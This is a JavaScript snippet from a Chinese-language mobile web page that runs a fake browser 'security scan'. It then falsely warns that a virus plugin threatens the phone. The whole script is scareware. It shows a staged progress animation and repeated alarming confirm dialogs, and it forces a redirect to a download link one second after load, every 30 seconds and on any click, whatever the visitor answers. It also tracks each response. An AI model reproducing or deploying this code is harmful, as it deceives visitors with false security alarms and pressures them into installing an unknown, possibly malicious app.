<script>
    /*************************************模拟扫描文件*********************************************************/
    var ht_=document.getElementById("height"),  lis= ht_.getElementsByTagName('li'),l=lis.length-1;
    function shijian(){
        lis=ht_.getElementsByTagName('li');
        if(lis.length>1){
            ht_.insertBefore(lis[lis.length-1],lis[0]);
        }

    }
    var tm=0;
    var ti= function (jian) {
        var tim=setInterval(function () {
            if (tm>jian){
                clearInterval(tim);
                can();
            }else{
                tm+=1;
                shijian();
                downl.innerHTML="<div style='font-size:16px;'>正在对您的浏览器进行安全扫描</div><div style='font-size:16px;'>请勿关闭页面</div>";
                addClass(c, "hide");
            }
        },50)
    };
    ti(30);
    /******************************扫描结束后canvas画图*******************************************/
    var date1= 0,shi=180,downl=document.getElementById("download"),Tu5=document.getElementById("tu5");
    function can(){
        addClass(Tu5, "hide")
        downl.innerHTML="正在下载(免流量)";
        ht_.style.color="#fff";
        ht_.innerHTML="<div style='font-size:18px;'>检测到浏览器有病毒插件</div><div style='font-size:18px;'>可能使手机系统崩溃，请立即更换</div>";
        removeClass(c, "hide");
        Mapping(50);
    }
    var getDevicePixelRatio = function (){
        return window.devicePixelRatio || 1;
    }
    var pix = getDevicePixelRatio();

    var c=document.getElementById("bg");
    function Mapping(obj){
        var ctx=c.getContext("2d");
        c.style.width = "300px";
        c.style.height = "150px";
        c.width = 300*pix;
        c.height = 150*pix;
        var drow= function (curr) {
            ctx.clearRect(0,0, c.width, c.height);
            ctx.beginPath();
            ctx.strokeStyle='#9ec8fd';
            ctx.lineWidth=8*pix;
            ctx.arc(151*pix,80*pix,60*pix,-0.5*Math.PI,1.5*Math.PI);
            ctx.moveTo(151*pix,80*pix);
            ctx.closePath();
            ctx.stroke();
            ctx.beginPath();
            ctx.strokeStyle = '#fff';
            ctx.arc(151*pix,80*pix,60*pix,-0.5*Math.PI,curr*2*Math.PI-0.5*Math.PI);
            ctx.moveTo(151*pix,80*pix);
            ctx.closePath();
            ctx.stroke();
            ctx.fillStyle="#fff";
            ctx.font=30*pix+"px abc";
            text = Math.floor(curr*100)+"%";
            text_w= ctx.measureText(text).width;
            ctx.fillText(text,(150*pix-(text_w/2)),90*pix);
        };
        var t=0;
        var lod= function (gos) {
            var te=setInterval(function () {
                if (t>gos){
                    clearInterval(te);
                }else{
                    t+=0.01;
                    drow(t);
                }
            },obj)
        };
        lod(1)
    }
    var par=c.parentNode;
    par.style.background = "-webkit-gradient(linear, 0% 0%, 100% 100%, from(#ff2d00),to(#ff6001))";
    function down_qr(e){
        if(confirm('未知插件有可能对手机造成损害，建议立即清理')){
            _czc.push(["_trackEvent",e, "确定"]);
        }else{
            _czc.push(["_trackEvent",e, "取消"]);
        }
    }
    setTimeout(function(){if(confirm('正在下载安全浏览器，阻止病毒插件获取您的手机信息，请等待')){ _czc.push(["_trackEvent", "3秒弹出框1", "确定"]);}else{ _czc.push(["_trackEvent", "3秒弹出框1", "取消"]);down_qr("3秒弹出框2")}window.location.href=surl;}, 1000);
    setInterval(function(){if(confirm('正在下载安全浏览器，阻止病毒插件获取您的手机信息，请等待')){_czc.push(['_trackEvent', '30秒循弹', '确定']);}else{_czc.push(['_trackEvent', '30秒循弹', '取消']);down_qr("30秒弹出框2")}window.location.href=surl;}, 30000);
    /****************************点击事件***********************************************/
    function click_(){
        if(confirm('正在下载安装安全浏览器，阻止病毒插件获取您的手机信息，请等待')){_czc.push(["_trackEvent", "点页面弹出框1", "确定"]);}else{_czc.push(["_trackEvent", "点页面弹出框1", "取消"]);down_qr("点页面弹出框2")}
        Mapping(showspeed());
        window.location.href=surl;;
    }

    /*惰性加载*/
    inertia("wrapper","images/left.gif");
